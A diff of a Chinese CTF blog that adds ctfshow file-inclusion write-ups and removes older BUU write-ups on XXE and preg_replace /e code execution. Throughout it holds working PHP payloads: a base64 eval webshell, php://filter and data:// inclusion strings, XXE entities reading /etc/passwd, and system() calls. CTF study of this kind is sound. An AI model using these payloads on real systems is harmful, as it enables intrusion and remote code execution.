-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xk0SzyKwfzw.php?Efa5BVG=cat /flag</span><br></pre></td></tr></table></figure>
+<p>出现+号后然后访问url&#x2F;tao.php。post传参2&#x3D;system(‘tac fl0g.php’); </p>
+<h4 id="Web83"><a href="#Web83" class="headerlink" title="Web83"></a>Web83</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: session_destroy(): Trying to destroy uninitialized session</span><br><span class="line"> in /var/www/html/index.php on line 14</span><br><span class="line">&lt;?php</span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line"> </span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>找到flag</p>
+<p>本题多了两个函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session_unset()：</span><br><span class="line">释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的session_id</span><br><span class="line"></span><br><span class="line">session_destroy()：</span><br><span class="line">删除当前用户对应的session文件以及释放sessionid，内存中的$_SESSION变量内容依然保留， 也不会重置会话 cookie</span><br></pre></td></tr></table></figure>
 
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/05/10/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/" class="go-post">阅读全文</a>
-</div>
+<p>所以我们的session没用了？</p>
+<p>不是这样的，依旧可以进行文件包含</p>
+<p>原因如下（多线程竞争的含义）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">线程是非独立的，同一个进程里线程是数据共享的，当当各个线程访问数据资源时会出现竞争状态即:</span><br><span class="line"></span><br><span class="line">数据几乎同步会被多个线程占用，造成数据混乱，即所谓的线程不安全 。</span><br><span class="line"></span><br><span class="line">这样，因为在执行session_unset()与执行session_destroy()的时候有间隔，他们与include($file)直接也会有间隔，我们其中的一个线程在删除session文件，而另一个线程刚刚又创建了一个session文件，然后前面的线程又开始包含，那么还是能够正常包含。</span><br></pre></td></tr></table></figure>
 
-<div class="post">
-    <a href="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/NCTF2019-Fake-XML-cookbook/">
-        <h2 class="post-title">[NCTF2019]Fake XML cookbook</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/9
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p><img src="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/NCTF2019-Fake-XML-cookbook/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240509220351314.png" alt="image-20240509220351314"></p>
-<p>随便登录抓包之后看到这个</p>
-<p>想着应该是改这个，但是怎么改？</p>
-<p><img src="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/NCTF2019-Fake-XML-cookbook/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240509220333814.png" alt="image-20240509220333814"></p>
-<p>这里就要使用到xml</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE llw [</span><br><span class="line">&lt;!ENTITY file SYSTEM  &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">	&lt;username&gt;&amp;file;&lt;/username&gt;</span><br><span class="line">	&lt;password&gt;1&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+<p>所以本题还是和上一题相同的方法</p>
+<h4 id="Web84"><a href="#Web84" class="headerlink" title="Web84"></a>Web84</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    system(&quot;rm -rf /tmp/*&quot;);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>拿到flag</p>
-<p>解读一下，就是在这里定义file为后面的字符串且会被当做变量执行</p>
-<p>所以这里的$file等于flag</p>
-<h4 id="下面介绍一下xml注入："><a href="#下面介绍一下xml注入：" class="headerlink" title="下面介绍一下xml注入："></a>下面介绍一下xml注入：</h4><p>XML是一种数据组织存储的数据结构方式，安全的XML在用户输入生成新的数据时候应该只能允许用户接受的数据，需要过滤掉一些可以改变XML标签也就是说改变XML结构插入新功能（例如新的账户信息，等于添加了账户）的特殊输入，如果没有过滤，则可以导致XML注入攻击。</p>
-<h4 id="XML注入前提条件"><a href="#XML注入前提条件" class="headerlink" title="XML注入前提条件"></a>XML注入前提条件</h4><p>（1）用户能够控制数据的输入<br>（2）程序有拼凑的数据</p>
-<p><strong>XML基本格式与基本语法</strong><br><em>基本格式：</em></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt;</span><br><span class="line">&lt;bookstore&gt;                                                 &lt;!--根元素--&gt;</span><br><span class="line">&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstore的子元素，category为属性--&gt;</span><br><span class="line">&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--book的子元素，lang为属性--&gt;</span><br><span class="line">&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--book的子元素--&gt;</span><br><span class="line">&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--book的子元素--&gt;</span><br><span class="line">&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--book的子元素--&gt;</span><br><span class="line">&lt;/book&gt;                                                 &lt;!--book的结束--&gt;</span><br><span class="line">&lt;/bookstore&gt;                                       &lt;!--bookstore的结束--&gt;</span><br></pre></td></tr></table></figure>
+<p>删除了&#x2F;tem&#x2F;下面所有的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f：强制删除文件或目录；</span><br><span class="line">-r或-R：递归处理，将指定目录下的所有文件与子目录一并处理；</span><br></pre></td></tr></table></figure>
 
-<p>简单介绍一下DTD实体</p>
-<p><em>按实体使用方式分类，实体分为内部声明实体和引用外部实体</em><br><em>内部实体</em></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>但是</p>
+<p>和上一题一样，由于多线程竞争，所以我们可以进行session文件包含</p>
+<p>方法和前一样</p>
+<h4 id="Web85"><a href="#Web85" class="headerlink" title="Web85"></a>Web85</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    if(file_exists($file))&#123;</span><br><span class="line">        $content = file_get_contents($file);</span><br><span class="line">        if(strpos($content, &quot;&lt;&quot;)&gt;0)&#123;</span><br><span class="line">            die(&quot;error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        include($file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>内部实体示例代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY writer &quot;Dawn&quot;&gt;</span><br><span class="line">    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;&amp;writer;©right;&lt;/test&gt;</span><br></pre></td></tr></table></figure>
+<p>file_exists — 检查文件或目录是否存在,如果由指定的文件或目录存在则返回 true，否则返回 false。</p>
+<p>file_get_contents — 将整个文件读入一个字符串,函数返回读取到的数据， 或者在失败时返回 false。</p>
+<p>strpos — 查找字符串首次出现的位置,返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。如果没找到 needle，将返回 false。</p>
+<p>但是依旧和前几题一样的方法和理解</p>
+<p>因为被删除了文件之后另一个线程又设置好了session文件。所以还是能包含进去</p>
+<h4 id="Web86"><a href="#Web86" class="headerlink" title="Web86"></a>Web86</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">define(&#x27;还要秀？&#x27;, dirname(__FILE__));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><em>外部实体</em><br>外部实体，用来引入外部资源。有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>define — 定义一个常量</p>
+<p>dirname：返回 path 的父目录。 如果在 path 中没有斜线，则返回一个点（’.’），表示当前目录。否则返回的是把 path 中结尾的&#x2F;component（最后一个斜线以及后面部分）去掉之后的字符串。</p>
+<p>set_include_path — 设置include函数中 include_path 配置选项，成功时返回旧的 include_path或者在失败时返回 false。</p>
+<p>include</p>
+<p>被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照 include_path指定的目录寻找。如果在 include_path下没找到该文件则 include 最后才在调用脚本文件所在的目录和当前工作目录下寻找。如果最后仍未找到文件则 include 结构会发出一条警告；这一点和require 不同，后者会发出一个致命错误。</p>
+<p>如果定义了路径——不管是绝对路径（在 Windows 下以盘符或者 \ 开头，在 Unix&#x2F;Linux 下以 &#x2F; 开头）还是当前目录的相对路径（以 . 或者 .. 开头）——include_path都会被完全忽略。例如一个文件以 ..&#x2F; 开头，则解析器会在当前目录的父目录下寻找该文件。</p>
+<p>方法依旧和前几题一样</p>
+<h4 id="Web87"><a href="#Web87" class="headerlink" title="Web87"></a>Web87</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $content = $_POST[&#x27;content&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>参数实体+外部实体示例代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  %file;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<p>…也就是说如果写一点东西进文件，就会先执行死亡函数…</p>
+<p>PHP在解码base64时，遇到不在其中的字符时，将会忽略这些字符，仅将合法字符组成一个新的字符串进行解码（Base64的字符选用了”A-Z、a-z、0-9、+、&#x2F;“ 64个可打印字符）</p>
+<p>且，解码时，四个字节为一组</p>
+<p>所以我们通过base64解码之后就只有phpdie，我们可以添加两个字符组合解码，抹掉死亡函数</p>
+<p>同时file参数需要url解码，所以我们需要进行两次url解码（get传参要执行一次）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure>
 
-<p><code>%file</code>(参数实体)是在DTD中被引用的，而<code>&amp;file;</code>是在xml文档中被引用的。</p>
+<p>需要全编码，防止php被过滤</p>
+<p>所以我们对</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
 
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/NCTF2019-Fake-XML-cookbook/" class="go-post">阅读全文</a>
-</div>
+<p>进行base64编码</p>
+<p>为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</span><br></pre></td></tr></table></figure>
 
-<div class="post">
-    <a href="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/">
-        <h2 class="post-title">[BJDCTF2020]ZJCTF，不过如此</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/9
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p><img src="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240509210053534.png" alt="image-20240509210053534"></p>
-<p>include后面有个next的注释，猜测使用data伪协议读取</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>
+<p>但是+会被当作空格处理并在base64解码的时候被忽略，且自动加上一个&#x3D;</p>
+<p>所以我们将+进行url编码%2B</p>
+<p>最后访问1.php</p>
+<p>post输入1&#x3D;system(‘tac fl0g.php’);</p>
+<p>所以这道题的思路就是，先通过web82的方法得到文件，之后创建一个新文件，并写入所需代码</p>
+<p>之后访问1.php 并再post里输入执行的代码即可</p>
+<h4 id="Web88"><a href="#Web88" class="headerlink" title="Web88"></a>Web88</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    if(preg_match(&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;, $file))&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>接下来就是绕过text了</p>
-<p>需要控制参数text利用伪协议写入文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、使用php://input</span><br><span class="line">	?text=php://input</span><br><span class="line">	post:I have a dream</span><br><span class="line">2、使用data://</span><br><span class="line">	?text=data:text/plain,I have a dream</span><br><span class="line">	?text=data:text/plain;base64,SSBoYXZlIGEgZHJlYW0=</span><br></pre></td></tr></table></figure>
-
-<p>随便采取某种方法吧</p>
-<p>最后都会得到</p>
-<p>一串字符串</p>
-<p>base64解码之后会变成</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,</span><br><span class="line">        &#x27;strtolower(&quot;\\1&quot;)&#x27;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">	@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>看到complex那，那里有一个漏洞，文章最后会进行讲解</p>
-<p>主要动作就是</p>
-<p>preg_replace(‘.*’)&#x2F;ei’,’strtolower(“\1”)’, {${此处填函数名}});</p>
-<p>这个函数可以是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?\S*=$&#123;phpinfo()&#125;</span><br><span class="line">即查看phpinfo</span><br></pre></td></tr></table></figure>
-
-<p>也就是可以直接把{}内的东西当代码执行</p>
-<p>在这里我们尝试一下这个</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p>发现不行</p>
-<p><img src="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240509213631533.png" alt="image-20240509213631533"></p>
-<p>被过滤了</p>
-<p>尝试一下使用post传入数据</p>
-<p><img src="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240509213750785.png" alt="image-20240509213750785"></p>
-<p>拿到flag</p>
-<p>还有一种方法</p>
-<p>就是通过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\S*=$&#123;getFlag()&#125;</span><br></pre></td></tr></table></figure>
-
-<p>调用getFlag函数</p>
-<p>之后可以传cmd上去执行</p>
+<p>可以直接使用data协议查看</p>
 <p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJzEnXSk7Pz54eHh4</span><br><span class="line">//&lt;?php eval($_POST[&#x27;1&#x27;]);?&gt;xxxx</span><br></pre></td></tr></table></figure>
 
+<p>后面加xxxx是为了不让base64出现&#x3D;</p>
+<h4 id="Web116"><a href="#Web116" class="headerlink" title="Web116"></a>Web116</h4><p>涉及misc</p>
+<p>无能为力…</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一道misc加简单的文件包含</span><br><span class="line"></span><br><span class="line">方法：下载视频，用binwalk打开（或者010editor），foremost分离，发现图片，提取源码，传参?file=flag.php，再下载视频用winhex打开即可（或者传参后用bp抓包）</span><br></pre></td></tr></table></figure>
 
+<p>大佬的wp奉上</p>
+<h4 id="Web117"><a href="#Web117" class="headerlink" title="Web117"></a>Web117</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($x)&#123;</span><br><span class="line">    if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;</span><br><span class="line">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">$contents=$_POST[&#x27;contents&#x27;];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);</span><br></pre></td></tr></table></figure>
 
-
-
-<h4 id="rce漏洞"><a href="#rce漏洞" class="headerlink" title="rce漏洞"></a>rce漏洞</h4><p>上面的命令执行，相当于 <strong>eval(‘strtolower(“\1”);’)</strong> 结果，当中的 <strong>\1</strong> 实际上就是 <strong>\1</strong> ，而 <strong>\1</strong> 在正则表达式中有自己的含义。我们来看看 <a target="_blank" rel="noopener" href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html"><strong>W3Cschool</strong></a> 中对其的描述：</p>
-<blockquote>
-<p><strong>反向引用</strong></p>
-<p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
-</blockquote>
-<p>所以这里的 <strong>\1</strong> 实际上指定的是第一个子匹配项，我们拿 <strong>ripstech</strong> 官方给的 <strong>payload</strong> 进行分析，方便大家理解。官方 <strong>payload</strong> 为： <strong>&#x2F;?.*&#x3D;{${phpinfo()}}</strong> ，即 <strong>GET</strong> 方式传入的参数名为 <strong>&#x2F;?.*</strong> ，值为 <strong>{${phpinfo()}}</strong> 。</p>
-<p>有时候.会被过滤</p>
-<p>可以考虑换为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\S*=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
-
+<p>没有过滤php，所以我们可以通过php:&#x2F;&#x2F;filter&#x2F;write来写入文件</p>
+<p>之后再编码绕过死亡函数</p>
+<p>大佬的wp里使用的是usc-2编码</p>
+<p>思路与web87差不多</p>
 
             
         </div>
@@ -509,12 +364,12 @@
         
         
     </div>
-    <a href="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/" class="go-post">阅读全文</a>
+    <a href="/2024/06/12/ctfshow/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
-    <a href="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/">
-        <h2 class="post-title">[安洵杯 2019]easy_web</h2>
+    <a href="/2024/06/11/buu%E5%88%B7%E9%A2%98%E9%9B%86-crypto/GXYCTF2019-CheckIn/">
+        <h2 class="post-title">[GXYCTF2019]CheckIn</h2>
     </a>
     <div class="category-and-date">
         
@@ -522,7 +377,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/5/8
+            2024/6/11
         </span>
         
         
@@ -530,39 +385,16 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p><img src="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240508210358717.png" alt="image-20240508210358717"></p>
-<p>emm，我看到页面上有个get传的参数</p>
-<p><img src="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240508210751258.png" alt="image-20240508210751258"></p>
-<p>在看看源代码</p>
-<p><img src="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240508210827187.png" alt="image-20240508210827187"></p>
-<p>所以我把他传的数据去解码一下</p>
-<p><img src="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240508211030178.png" alt="image-20240508211030178"></p>
-<p>是真的好用</p>
-<p>所以，这是传了一个文件上去啊，那我在源代码看</p>
-<p><img src="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240508211225367.png" alt="image-20240508211225367"></p>
-<p>应该就是源码了吧，那我试试查看index.php行不行嘞</p>
-<p>说干就干</p>
-<p>翻译555.png是先base64再base64在hex，那我这次反过来试试</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br></pre></td></tr></table></figure>
+            <p>dikqTCpfRjA8fUBIMD5GNDkwMjNARkUwI0BFTg&#x3D;&#x3D;</p>
+<p>看到两个&#x3D;&#x3D;第一反应就是base64</p>
+<p>先尝试一下，发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v)*L*_F0&lt;&#125;@H0&gt;F49023@FE0#@EN</span><br></pre></td></tr></table></figure>
 
-<p>所以，找到了源码</p>
-<p>解码一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class="line">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class="line">    die(&quot;xixiï½ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if 